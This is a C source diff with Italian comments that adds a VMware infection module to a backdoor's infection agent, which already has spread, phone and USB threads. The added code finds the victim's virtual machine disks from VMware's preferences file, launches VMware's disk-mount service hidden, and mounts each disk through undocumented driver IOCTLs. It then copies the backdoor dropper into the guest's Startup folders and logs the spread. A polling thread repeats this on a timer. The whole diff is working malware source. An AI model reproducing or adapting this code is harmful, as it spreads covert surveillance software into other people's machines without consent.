@@ -1,23 +1,35 @@
+#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
+#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
+#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
+#define VMW_AGENT_SLEEP_TIME 10*60*1000 // Ogni 10 minuti controlla le VM
+
 BOOL bPM_PDAAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 BOOL bPM_pdacp = FALSE; // Semaforo per l'uscita del thread per pda
 BOOL bPM_sprcp = FALSE; // Semaforo per l'uscita del thread per spread
 BOOL bPM_usbcp = FALSE; // Semafoto per l'uscita del thread per usb
+BOOL bPM_vmwcp = FALSE; // Semafoto per l'uscita del thread per vm
 
 HANDLE hPDAThread = NULL;
 HANDLE hSpreadThread = NULL;
 HANDLE hUSBThread = NULL;
+HANDLE hVMWThread = NULL;
 
 BOOL infection_spread = FALSE;	// Deve fare spread?
 BOOL infection_pda = FALSE;		// Deve infettare i telefoni?
 BOOL infection_usb = FALSE;		// Deve infettare le USB?
+BOOL infection_vm = FALSE;		// Deve infettare le VM?
 
 BOOL one_user_infected = FALSE; // Infetta solo un utente in una run
+DWORD vm_delay = VMW_AGENT_SLEEP_TIME; // Delay per il loop di polling sulle VM
 
 #pragma pack(4)
 typedef struct {
 	BOOL infection_spread;
 	BOOL infection_pda;
 	BOOL infection_usb;
+	DWORD version;
+	BOOL infection_vm;
+	DWORD vm_delay;
 } infection_conf_struct;
 #pragma pack()
 
@@ -66,9 +78,6 @@ CeFindClose_t pCeFindClose = NULL;
 
 extern void SetLoadKeyPrivs();
 
-#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
-#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
-#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
 #define PDA_LOG_DIR L"$MS313Mobile"
 #define AUTORUN_BACKUP_NAME L"Autorun4.exe"
 #define CONFIG_FILE_NAME L"cptm511.dql"
@@ -679,6 +688,424 @@ BOOL InfectUSB(WCHAR *drive_letter, char *rcs_name)
 	return TRUE;
 }
 
+////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////// Infezione VMWare /////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////
+struct _ioctl_vstor
+{
+    unsigned short   len;
+    unsigned short   dummy0;
+    unsigned long    dw1;
+    unsigned long    dw2;
+    unsigned long    dw3;
+    unsigned long    dw4;
+    unsigned long    dw5;
+    unsigned long    dw6;
+    unsigned char    Path[MAX_PATH];
+    unsigned char    extra[4];
+};
+
+struct _ioctl_dismount
+{
+    unsigned short   len;    
+    unsigned short   dummy0;    
+    unsigned long    dw1;    
+    unsigned long    dw2;    
+    unsigned long    dw3;    
+    unsigned long    dw4;    
+    unsigned long    VolumeID;    
+    unsigned long    dw6;    
+};
+
+
+extern WCHAR *UTF8_2_UTF16(char *str);
+	
+// Cerca una drive letter libera
+char *FindFreeDriveLetter()
+{
+	static char drive_letter[4];
+	
+	drive_letter[1] = ':';
+	drive_letter[2] = '\\';
+	drive_letter[3] = NULL;
+
+	// XXX - Per ora riesce a montarlo solo su Z
+	drive_letter[0] = 'Z';
+	return drive_letter;
+
+/*	for (drive_letter[0]='E'; drive_letter[0]<='Z'; drive_letter[0]++) 
+		if (GetDriveType(drive_letter) == DRIVE_NO_ROOT_DIR)
+			return drive_letter;
+	return NULL;*/
+}
+
+BOOL StartVMService()
+{
+	DWORD len;
+	HKEY hKey;
+	char service_path[MAX_PATH];
+	STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+	// Verifica che non sia gia' startato per conto suo
+	if (HM_FindPid("vixDiskMountServer.exe", FALSE))
+		return TRUE;
+
+	if(FNC(RegOpenKeyExA)(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vmplayer.exe", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
+		return FALSE;
+	len = sizeof(service_path);
+	if(FNC(RegQueryValueExA)(hKey, "Path", NULL, NULL, (LPBYTE)service_path, &len) != ERROR_SUCCESS) {
+		RegCloseKey(hKey);
+		return FALSE;
+	}
+	RegCloseKey(hKey);
+	_snprintf_s(service_path, sizeof(service_path), _TRUNCATE, "%s\\vixDiskMountServer.exe", service_path);		
+
+	ZeroMemory( &si, sizeof(si) );
+    si.cb = sizeof(si);
+	si.wShowWindow = SW_HIDE;
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	HM_CreateProcess((char *)service_path, 0, &si, &pi, 0);
+	if (!pi.dwProcessId) 
+		return FALSE;
+	Sleep(1000); // Gli da' del tempo per inizializzarsi...
+	return TRUE;
+}
+
+// Dato il path, torna il voulme id
+#define MAX_VOLUME_ID_LEN 16
+DWORD FindDiskID(HANDLE hfile, char *disk_path)
+{
+	DWORD dummy;
+	char reply[0x3FDC];
+	char string_match[MAX_PATH*2];
+	char *ptr;
+	DWORD disk_id = 0;
+	DWORD i;
+
+	BYTE msg[20] = { 0x14, 0x00, 0x00, 0x00, 0xd0, 0x94, 0x57, 0x04, 0xba, 0xab, 0x00 ,0x00, 0x00, 0x00, 0x6d, 0x64, 0x04, 0x00, 0x00, 0x00};
+
+	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) 
+		return 0;
+
+	_snprintf_s(string_match, sizeof(string_match), " type=disk_volume file=\"%s\"", disk_path);
+	if (! (ptr = (char *)memmem(reply, sizeof(reply), string_match, strlen(string_match))) )
+		return 0;
+	*ptr = 0;
+	for (i=0; i<MAX_VOLUME_ID_LEN; i++, ptr--) {
+		if (*ptr == '=') {
+			ptr++;
+			disk_id = atoi(ptr);
+			return disk_id;
+		}
+	}
+	return 0;
+}
+
+BOOL FindVStoreDevice(WCHAR *dev_store)
+{
+	DWORD dummy;
+	LPVOID *drivers;
+	DWORD cbNeeded = 0;
+	int cDrivers, i;
+
+	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
+	if (cbNeeded == 0)
+		return FALSE;
+	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
+		return FALSE;
+
+	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
+		WCHAR szDriver[1024];
+		cDrivers = cbNeeded/sizeof(LPVOID);
+		for (i=0; i < cDrivers; i++ ) {
+			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
+				if (!_wcsnicmp(szDriver, L"vstor2-", wcslen(L"vstor2-"))) {
+					WCHAR *ptr;
+					if(ptr = wcschr(szDriver, L'.')) {
+						*ptr = 0;
+						_snwprintf_s(dev_store, MAX_PATH, _TRUNCATE, L"\\\\.\\%s", szDriver);		
+						free(drivers);
+						return TRUE;
+					}
+					free(drivers);
+					return FALSE;
+				}
+			}
+		}
+	}
+	free(drivers);
+	return FALSE;
+}
+
+// Monta un disco virtuale
+BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
+{
+	HANDLE hfile;
+	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
+	_ioctl_vstor msg;
+	DWORD dummy;
+
+	// Al primo tentativo di mount starta il servizio
+	if (!StartVMService())
+		return FALSE;
+
+	// Costruisce il messaggio
+	ZeroMemory(&msg, sizeof(msg));
+	msg.len = sizeof(struct _ioctl_vstor);
+    msg.dw1 = 0x045cdcc8; //C8 DC 5C 04
+    msg.dw2 = 0x0000abba;
+    msg.dw3 = 0x00000000;
+    msg.dw4 = 0x00000002;
+    msg.dw5 = 0x00000000;
+    msg.dw6 = 0x02000000;
+	strcpy((char *) msg.Path, disk_path);
+
+	// Manda la ioctl per montare il disco
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	if (hfile == INVALID_HANDLE_VALUE) 
+		return FALSE;
+
+	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+
+	*volume_id = FindDiskID(hfile, disk_path);
+	CloseHandle(hfile);
+	return TRUE;
+}
+
+// Smonta un disco virtuale
+BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
+{
+	HANDLE hfile;
+	char reply[0x3FDC];
+	WCHAR vstore[MAX_PATH];
+	_ioctl_dismount msg;
+	DWORD dummy;
+
+	// Costruisce il messaggio
+	ZeroMemory(&msg, sizeof(msg));
+    msg.len = sizeof(msg);
+    msg.dw2 = 0x0000abba;
+    msg.dw3 &= 0xffff0000;
+    msg.dw4 = 0x3;
+    msg.VolumeID = volume_id;
+    msg.dw6 = 0x01;
+
+	// Manda la ioctl per smontare il disco
+	if (!FindVStoreDevice(vstore))
+		return FALSE;
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+	if (hfile == INVALID_HANDLE_VALUE) 
+		return FALSE;
+
+	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+	CloseHandle(hfile);
+	return TRUE;
+}
+
+// Copia i file del dropper sul path specificato nelle potenziali directory di autorun
+BOOL InfectVMDisk(char *drive_letter, char *exe_name)
+{
+	char win7_path[MAX_PATH];
+	char xp_path[MAX_PATH];
+	char s_path[MAX_PATH];
+	HANDLE hfile;
+
+	_snprintf_s(win7_path, MAX_PATH, _TRUNCATE, "%sProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.exe", drive_letter, exe_name);
+	_snprintf_s(xp_path, MAX_PATH, _TRUNCATE, "%sDocuments and Settings\\All Users\\Start Menu\\Programs\\Startup\\%s.exe", drive_letter, exe_name);
+	HM_CompletePath(exe_name, s_path);
+
+	// Se c'e' uno dei due file, vuol dire che e' gia' infetto
+	hfile = CreateFile(win7_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+
+	hfile = CreateFile(xp_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+
+	// Cerca prima di copiare il path win7, perche' su alcuni win7 potrebbe esserci anche l'altro (che pero' e' inattivo)
+	// Su XP invece di sicuro non c'e' il path di win7
+	if (FNC(CopyFileA)(s_path, win7_path, TRUE))
+		return TRUE;
+	if (FNC(CopyFileA)(s_path, xp_path, TRUE))
+		return TRUE;
+
+	return FALSE;
+}
+
+// Monta e infetta un dato disco virtuale
+void InfectVMWare(char *disk_path)
+{
+	char *drive_letter;
+	DWORD volume_id = 0;
+	WCHAR msg[MAX_PATH*2];
+
+	if (! (drive_letter = FindFreeDriveLetter()) )
+		return;
+
+	if (!MountVMDisk(disk_path, drive_letter, &volume_id))
+		return;
+
+	if (InfectVMDisk(drive_letter, EXE_INSTALLER_NAME)) {
+		REPORT_STATUS_LOG("- VMWare Infection..............OK\r\n");
+		_snwprintf_s(msg, sizeof(msg)/sizeof(WCHAR), _TRUNCATE, L"[Infection Agent]: Spread to VMWare %S", disk_path);		
+		SendStatusLog(msg);	
+	}
+
+	// Se non e' riuscito a recuperare l'id del volume prova a smontarli tutti
+	if (volume_id == 0) {
+		for (int i=100; i<256; i++)
+			UnmountVMDisk(drive_letter, i);
+	} else
+		UnmountVMDisk(drive_letter, volume_id);
+}
+
+// Cerca tutti i dischi delle vmware preferite
+void FindVMDisk(char *conf_path)
+{
+	HANDLE hFile;
+	HANDLE hMap;
+	DWORD config_size;
+	char *config_map, *ptr, *ptr_end;
+	char *local_config_map;
+	char disk_path[MAX_PATH];
+	WCHAR *w_path;
+
+	// Mappa in memoria il file di config
+	w_path = UTF8_2_UTF16(conf_path);
+	if (!w_path)
+		return;
+	if ((hFile = FNC(CreateFileW)(w_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return;
+	SAFE_FREE(w_path);
+	
+	config_size = GetFileSize(hFile, NULL);
+	if (config_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return;
+	}
+	
+	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
+	if (local_config_map == NULL) {
+		CloseHandle(hFile);
+		return;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return;
+	}
+
+	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
+		memcpy(local_config_map, config_map, config_size);
+		FNC(UnmapViewOfFile)(config_map);
+		if (ptr = strstr(local_config_map, ".vmdk\"")) {
+			ptr_end = ptr + strlen(".vmdk");
+			*ptr_end = NULL;
+			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
+			if (*ptr == '"') {
+				ptr++;
+				sprintf_s(disk_path, conf_path);
+				ptr_end = strrchr(disk_path, '\\');
+				if (ptr_end) {
+					ptr_end++;
+					*ptr_end = NULL;
+					strcat_s(disk_path, ptr);
+					// Infetta il disco virtuale specificato
+					InfectVMWare(disk_path);
+				}
+			}
+		}
+	}
+	SAFE_FREE(local_config_map);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+
+}
+
+// Cerca VMWare se installato sul sistema (in ultima istanza infetta anche tutte le VM...)
+void FindAndInfectVMware()
+{
+	WCHAR config_path[MAX_PATH];
+	HANDLE hFile;
+	HANDLE hMap;
+	DWORD config_size, i;
+	char *config_map, *ptr, *ptr_end;
+	char *local_config_map;
+	char obj_string[MAX_PATH];
+
+	// Verifica che esista il file della backdoor
+	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
+	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+		return;
+	CloseHandle(hFile);
+
+	// Mappa in memoria il file di config
+	if (GetEnvironmentVariableW(L"appdata", config_path, MAX_PATH) == 0)
+		return;
+	wcscat_s(config_path, MAX_PATH, L"\\VMware\\preferences.ini");
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return;
+	
+	config_size = GetFileSize(hFile, NULL);
+	if (config_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return;
+	}
+	
+	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
+	if (local_config_map == NULL) {
+		CloseHandle(hFile);
+		return;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return;
+	}
+
+	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
+		memcpy(local_config_map, config_map, config_size);
+		FNC(UnmapViewOfFile)(config_map);
+
+		// Parsa per cercare i vmx
+		ptr_end = local_config_map;
+		while (ptr = strstr(ptr_end, ".vmx\"")) {
+			ptr_end = ptr + strlen(".vmx");
+			*ptr_end = NULL;
+			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
+			if (*ptr == '"') {
+				ptr++;
+				// Per ogni macchina trovata, cerca il disco virtuale corrispondente
+				FindVMDisk(ptr);	
+			}
+			*ptr_end = '"';
+		}	
+	}
+	SAFE_FREE(local_config_map);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+}
+
+
+
 ///////////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////////
@@ -740,6 +1167,15 @@ DWORD WINAPI MonitorUSBThread(DWORD dummy)
 	return 0;
 }
 
+DWORD WINAPI MonitorVMThread(DWORD dummy)
+{
+	LOOP {
+		if (infection_vm) 
+			FindAndInfectVMware(); 
+		CANCELLATION_SLEEP(bPM_vmwcp, vm_delay);
+	}
+	return 0;
+}
 
 DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {
@@ -762,10 +1198,12 @@ DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 			hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
 		hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
 		hUSBThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUSBThread, NULL, 0, &dummy);
+		hVMWThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorVMThread, NULL, 0, &dummy);
 	} else {
 		QUERY_CANCELLATION(hPDAThread, bPM_pdacp);
 		QUERY_CANCELLATION(hSpreadThread, bPM_sprcp);
 		QUERY_CANCELLATION(hUSBThread, bPM_usbcp);
+		QUERY_CANCELLATION(hVMWThread, bPM_vmwcp);
 	}
 
 	return 1;
@@ -779,6 +1217,13 @@ DWORD __stdcall PM_PDAAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
 		infection_spread = infection_conf->infection_spread;
 		infection_pda = infection_conf->infection_pda;
 		infection_usb = infection_conf->infection_usb;
+		// Se e' la versione nuova della conf legge se infettare le vm
+		// e ogni quanto farlo (nella conf e' in secondi, ma a me serve in millisecondi)
+		if (infection_conf->version == 20110915) {
+			infection_vm = infection_conf->infection_vm;
+			if (infection_conf->vm_delay)
+				vm_delay = infection_conf->vm_delay * 1000;
+		}
 	}
 
 	PM_PDAAgentStartStop(bStartFlag, TRUE);
